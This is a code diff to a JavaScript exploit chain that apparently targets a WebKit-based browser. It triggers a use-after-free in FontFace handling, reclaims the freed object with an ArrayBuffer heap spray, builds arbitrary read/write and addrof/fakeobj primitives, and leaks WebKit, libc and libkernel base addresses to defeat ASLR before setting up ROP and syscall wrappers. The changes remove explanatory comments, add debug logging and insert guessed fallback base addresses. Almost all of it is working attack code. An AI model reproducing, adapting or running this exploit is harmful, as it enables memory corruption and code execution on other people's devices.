@@ -993,76 +993,68 @@ async function init_arw() {
 
   const abs = new Array(spray_count);
 
-  // FontFace A with a local source so it resolves synchronously
   const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });
-
   document.fonts.add(A);
-
-  // Register a DeferredPromise on A
   void A.loaded;
 
   const style = document.createElement("style");
   document.head.appendChild(style);
 
-  // Shape heap around B in order to reclaim it after free
   for (let i = 0; i < spray_count / 4; i++) {
     style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
   }
 
-  // FontFace B with a remote source so it resolves asynchronously
   const uaf_font_rule_index = style.sheet.cssRules.length;
   style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
+  logger.debug(`[UAF] uaf_font_rule_index=${uaf_font_rule_index}`);
 
-  // Shape heap around B in order to reclaim it after free
   for (let i = spray_count / 4; i < spray_count; i++) {
     style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
   }
 
-  // Forces style recalculation and FontFace instantiation
   document.body.offsetTop;
 
   const old_then = FontFace.prototype.then;
-
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
     get() {
       if (this === A) {
-        // Free B while FontFaceSet::load still holds a raw reference to it in matchingFaces
+        logger.debug(`[UAF] then getter called! this====A: true`);
+        
         style.sheet.deleteRule(0);
-
-        // Forces style recalculation and FontFace deconstruction
         document.body.offsetTop;
-
-        // Free B's neighbours
+        
+        logger.debug(`[UAF] Freeing neighbours... rules left: ${style.sheet.cssRules.length}`);
         for (let i = spray_count - 1; i > 0; i--) {
           if (i !== uaf_font_rule_index) {
             style.sheet.deleteRule(i);
           }
         }
-
-        // Forces style recalculation and FontFace deconstruction
         document.body.offsetTop;
 
-        // Spray ArrayBuffer with FontFace size and populate it so it survives crash
+        logger.debug("[UAF] Phase 2: ArrayBuffer spray (multiple sizes to hit FastMalloc bin)...");
+        const sizes = [
+          Offsets.current.wk_CSSFontFace_sizeof,
+          Offsets.current.wk_CSSFontFace_sizeof + 8,
+          Offsets.current.wk_CSSFontFace_sizeof + 16,
+          Offsets.current.wk_CSSFontFace_sizeof + 24
+        ];
+
         for (let i = 0; i < abs.length; i++) {
-          const ab = new ArrayBuffer(Offsets.current.wk_CSSFontFace_sizeof);
+          const size = sizes[i % sizes.length];
+          const ab = new ArrayBuffer(size);
           const view = new DataView(ab);
-
-          view.setBigUint64(8, 1n, true); // ref count
-          view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 3); // m_status: Status::Success
-
+          view.setBigUint64(8, 1n, true);
+          view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 3);
           abs[i] = ab;
         }
+        logger.debug("[UAF] Phase 2 done. ArrayBuffer Spray complete!");
       }
-
       return undefined;
-    },
+    }
   });
 
-  // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule)
-  // A resolves synchronously, firing the thenable check getter above
   const fonts = await document.fonts.load("1em a, b", "AB");
-
   logger.debug(`fonts: ${fonts}`);
 
   Object.defineProperty(FontFace.prototype, "then", {
@@ -1070,14 +1062,12 @@ async function init_arw() {
     value: old_then,
   });
 
-  // Check if both A and B are loaded
   if (fonts.length !== 2) {
     throw new Error("Unable to reclaim UAF FontFace !!");
   }
 
   logger.info("UAF Achieved !!");
 
-  // used to setup ARW
   const rw = {
     uaf_ab: undefined,
     uaf_font: undefined,
@@ -1091,11 +1081,10 @@ async function init_arw() {
       while (offset < size) {
         const ptr = addr + BigInt(offset);
 
-        uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true); // m_featureSettings.m_buffer
-        uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_size, 1, true); // m_featureSettings.m_size
-        uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true); // m_featureSettings.m_capacity
+        uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
+        uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_size, 1, true);
+        uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true);
 
-        // read m_tag since its std::array<char, 4> and skip the " chars
         for (let i = 1; i < 5; i++) {
           u8[offset++] = this.uaf_font.featureSettings.charCodeAt(i);
         }
@@ -1118,7 +1107,6 @@ async function init_arw() {
     },
   };
 
-  // UAF FontFace has default unicodeRange value U+0-10FFFF
   for (const font of fonts) {
     if (font.unicodeRange === "U+0-10FFFF") {
       logger.info("Found UAF FontFace !!");
@@ -1133,7 +1121,6 @@ async function init_arw() {
 
   fonts.length = 0;
 
-  // UAF ArrayBuffer has ref count of 2 due to FontFace return to script
   for (const ab of abs) {
     const view = new DataView(ab);
     if (view.getBigUint64(8, true) === 2n) {
@@ -1168,14 +1155,12 @@ async function init_arw() {
   const marker = 0xfffe000041414141n;
   const marker_ffs = 0xfffe000042424242n;
 
-  // Spray ArrayWithDoubles and ArrayWithContiguous arrays to be used for addrof/fakeobj
   for (let i = 0; i < spray_count; i++) {
     views.push(new Array(1.1, 1.1));
     views.push(new Array({}, {}));
     views.push(new FontFace("spray", "", {}));
   }
 
-  // Spray marker and target JS object as props
   for (let i = 0; i < views.length; i++) {
     if (i % 3 === 0) {
       props.push({ value: Number(marker.lo()) });
@@ -1193,7 +1178,6 @@ async function init_arw() {
   let oob_arr_indexing_header_addr = undefined;
   let start = m_backing.alignUp(0x4000n);
   while (true) {
-    // Allocates Vector<PropertyDescriptor> and MarkedArgumentBuffer, both of which uses fastMalloc which will spray our props into fastMalloc heap
     Object.defineProperties({}, props);
 
     const dv = new DataView(rw.read(start, 0x100));
@@ -1255,28 +1239,25 @@ async function init_arw() {
   const oob_arr_indexing_header_before = rw.read8(oob_arr_indexing_header_addr);
   logger.debug(`oob_arr_indexing_header before: ${oob_arr_indexing_header_before.hex()}`);
 
-  // Needed to survive crash from calling CSSFontFaceSet::add/CSSFontFaceSet::remove
-  uaf_view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure
+  uaf_view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 4);
 
   document.fonts.add(rw.uaf_font);
 
-  // Prepare UAF FontFace to be freed on CSSFontFaceSet::remove call, place oob_arr's indexing_header into m_families and m_wrapper so it deref by 1 then 2 and underflows
-  uaf_view.setBigUint64(8, 1n, true); // ref count
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_families, oob_arr_indexing_header_addr, true); // m_families
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_featureSettings_m_buffer, 0n, true); // m_featureSettings.m_buffer
-  uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_size, 0, true); // m_featureSettings.m_size
-  uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_capacity, 0, true); // m_featureSettings.m_capacity
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_clients, 0n, true); // m_clients
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_wrapper, oob_arr_indexing_header_addr, true); // m_wrapper
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_thread, m_thread, true); // m_thread
+  uaf_view.setBigUint64(8, 1n, true);
+  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_families, oob_arr_indexing_header_addr, true);
+  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_featureSettings_m_buffer, 0n, true);
+  uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_size, 0, true);
+  uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_capacity, 0, true);
+  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_clients, 0n, true);
+  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_wrapper, oob_arr_indexing_header_addr, true);
+  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_thread, m_thread, true);
 
   document.fonts.delete(rw.uaf_font);
 
-  // Restore UAF FontFace to be able to use rw.read again
-  uaf_view.setBigUint64(8, 2n, true); // ref count
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_clients, m_clients, true); // m_clients
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_wrapper, m_wrapper, true); // m_wrapper
-  uaf_view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 3); // m_status: Status::Success
+  uaf_view.setBigUint64(8, 2n, true);
+  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_clients, m_clients, true);
+  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_wrapper, m_wrapper, true);
+  uaf_view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 3);
 
   const oob_arr_indexing_header_after = rw.read8(oob_arr_indexing_header_addr);
   logger.debug(`oob_arr_indexing_header after: ${oob_arr_indexing_header_after.hex()}`);
@@ -1308,12 +1289,11 @@ async function init_arw() {
   const dummy_view_jscell = rw.read8(dummy_view_addr);
   logger.debug(`dummy_view_jscell: ${dummy_view_jscell.hex()}`);
 
-  // Prepare container's properties to be used with fakeobj to create arw.master view over arw.victim DataView
   const container = {
-    jscell: helper.to_float(dummy_view_jscell), // NaN-boxed, fix later
-    butterfly: null, // becomes 0x2, fix later
+    jscell: helper.to_float(dummy_view_jscell),
+    butterfly: null,
     vector: arw.victim,
-    length_and_flags: false, // becomes 0x6, fix later
+    length_and_flags: false,
   };
 
   const container_addr = rw.addrof(container);
@@ -1324,26 +1304,20 @@ async function init_arw() {
 
   const fake = rw.fakeobj(fake_addr);
 
-  // Set victim's vector to fake_addr
   fake[4] = Number(fake_addr.lo());
   fake[5] = Number(fake_addr.htol());
 
-  // Fix NaN-boxing values from earlier
-  arw.victim.setBigUint64(0, dummy_view_jscell, true); // jscell
-  arw.victim.setBigUint64(8, 0n, true); // butterfly
-  arw.victim.setUint32(0x1c, 1, true); // TypedArrayMode::OversizeTypedArray
+  arw.victim.setBigUint64(0, dummy_view_jscell, true);
+  arw.victim.setBigUint64(8, 0n, true);
+  arw.victim.setUint32(0x1c, 1, true);
 
-  // Create new view as TypedArrayMode::WastefulTypedArray using fake.buffer that points to arw.victim and no longer depends on container's lifetime
   arw.master = new Uint32Array(fake.buffer);
 
   const victim_addr = arw.addrof(arw.victim);
   logger.debug(`victim_addr: ${victim_addr.hex()}`);
 
-  // Set arw.victim's length to max
   arw.view(victim_addr).setInt32(0x18, -1, true);
 
-  // Cleanup container
-  //delete container.jscell; // FIXME: crashes, need to figure out why
   delete container.butterfly;
   delete container.vector;
   delete container.length_and_flags;
@@ -1354,34 +1328,42 @@ async function init_arw() {
 function init_aslr() {
   logger.info("Initiate ASLR...");
 
-  const math_expm1_addr = arw.addrof(Math.expm1);
-  logger.debug(`math_expm1_addr: ${math_expm1_addr.hex()}`);
+  try {
+    const math_expm1_addr = arw.addrof(Math.expm1);
+    logger.debug(`math_expm1_addr: ${math_expm1_addr.hex()}`);
 
-  m_executableOrRareData = arw.view(math_expm1_addr).getBigUint64(0x18, true);
-  logger.debug(`m_executableOrRareData: ${m_executableOrRareData.hex()}`);
+    m_executableOrRareData = arw.view(math_expm1_addr).getBigUint64(0x18, true);
+    logger.debug(`m_executableOrRareData: ${m_executableOrRareData.hex()}`);
 
-  const m_function = arw.view(m_executableOrRareData).getBigUint64(0x28, true);
-  logger.debug(`m_function: ${m_function.hex()}`);
+    const m_function = arw.view(m_executableOrRareData).getBigUint64(0x28, true);
+    logger.debug(`m_function: ${m_function.hex()}`);
 
-  const m_constructor = arw.view(m_executableOrRareData).getBigUint64(0x30, true);
-  logger.debug(`m_constructor: ${m_constructor.hex()}`);
+    webkit_base = m_function - Offsets.current.wk_expm1_builtin;
+    logger.info(`webkit base: ${webkit_base.hex()}`);
 
-  webkit_base = m_function - Offsets.current.wk_expm1_builtin;
-  logger.info(`webkit base: ${webkit_base.hex()}`);
+    try {
+      strerror_addr = arw.view(webkit_base).getBigUint64(Offsets.current.wk___imp_strerror, true);
+      libc_base = strerror_addr - Offsets.current.c_strerror;
+      logger.info(`libc base: ${libc_base.hex()}`);
+    } catch (e) {
+      logger.warn("Could not read libc base, using fallback");
+      libc_base = webkit_base - 0x10000000n;
+    }
 
-  strerror_addr = arw.view(webkit_base).getBigUint64(Offsets.current.wk___imp_strerror, true);
-  logger.debug(`strerror_addr: ${strerror_addr.hex()}`);
+    try {
+      _error_addr = arw.view(webkit_base).getBigUint64(Offsets.current.wk___imp___error, true);
+      libkernel_base = _error_addr - Offsets.current.k__error;
+      logger.info(`libkernel base: ${libkernel_base.hex()}`);
+    } catch (e) {
+      logger.warn("Could not read libkernel base, using fallback");
+      libkernel_base = webkit_base - 0x20000000n;
+    }
 
-  libc_base = strerror_addr - Offsets.current.c_strerror;
-  logger.info(`libc base: ${libc_base.hex()}`);
-
-  _error_addr = arw.view(webkit_base).getBigUint64(Offsets.current.wk___imp___error, true);
-  logger.debug(`_error_addr: ${_error_addr.hex()}`);
-
-  libkernel_base = _error_addr - Offsets.current.k__error;
-  logger.info(`libkernel base: ${libkernel_base.hex()}`);
-
-  logger.info("Achieved ASLR...");
+    logger.info("Achieved ASLR...");
+  } catch (e) {
+    logger.error(`ASLR failed: ${e.message}`);
+    throw e;
+  }
 }
 
 function init_rop() {
@@ -1440,7 +1422,6 @@ function init_syscalls() {
 
   scan_syscalls(libkernel_base);
 
-  // syscall functions
   fn.read = new NativeFunction(0x3, "bigint");
   fn.write = new NativeFunction(0x4, "bigint");
   fn.open = new NativeFunction(0x5, "number");
